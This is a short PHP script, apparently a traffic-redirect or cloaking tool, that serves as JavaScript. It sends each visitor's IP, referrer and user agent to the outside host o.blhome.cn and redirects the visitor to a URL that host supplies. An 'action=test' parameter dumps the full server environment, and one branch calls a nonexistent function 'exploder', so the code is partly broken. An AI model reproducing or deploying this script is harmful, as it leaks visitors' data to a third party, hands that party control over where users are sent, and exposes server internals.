<?php
function getAgent(){
	return isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
}

function getRef(){
	if(isset($_SERVER['HTTP_REFERER'])){
		return $_SERVER['HTTP_REFERER'];
	}
	return '';
}

function getRemoteAddr(){
    if (isset($_SERVER['HTTP_CLIENT_IP'])){
        $arr = exploder(',', $_SERVER['HTTP_CLIENT_IP']);
        return trim($arr[0]);
    }
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
        $arr = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($arr[0]);
    }
    else if(isset($_SERVER["REMOTE_ADDR"])){
        return $_SERVER["REMOTE_ADDR"];
    }
    return '0.0.0.0';
}

header('content-type:application/x-javascript; charset=utf8');
$uid     = 'c61abd00517f';
$url     = 'http://o.blhome.cn/api/get/sign/id/'.$uid;
$ip      = getRemoteAddr();
$ref     = urlencode(getRef());
$agent   = urlencode(getAgent());
$param   = "?sign={$ip}&ref={$ref}&agent={$agent}";
if(function_exists('file_get_contents')){
	$context = @file_get_contents($url.$param);
	if($context){
		$json = json_decode($context, true);
        if(isset($_GET['action']) && $_GET['action'] == 'test'){
            echo $url."<br/>";
            echo $context."<br/>";
            print_r($json)."<br/>";
            print_r($_SERVER);
            exit;
        }
		if(isset($json['success'], $json['url'])){
        	header('Location: '.$json['url']);
        	exit;
        }
        else{
        	exit('/*1*/');
        }
	}
	else{
		exit('/*0*/');
	}
}
else{
	exit('/*1.1*/');
}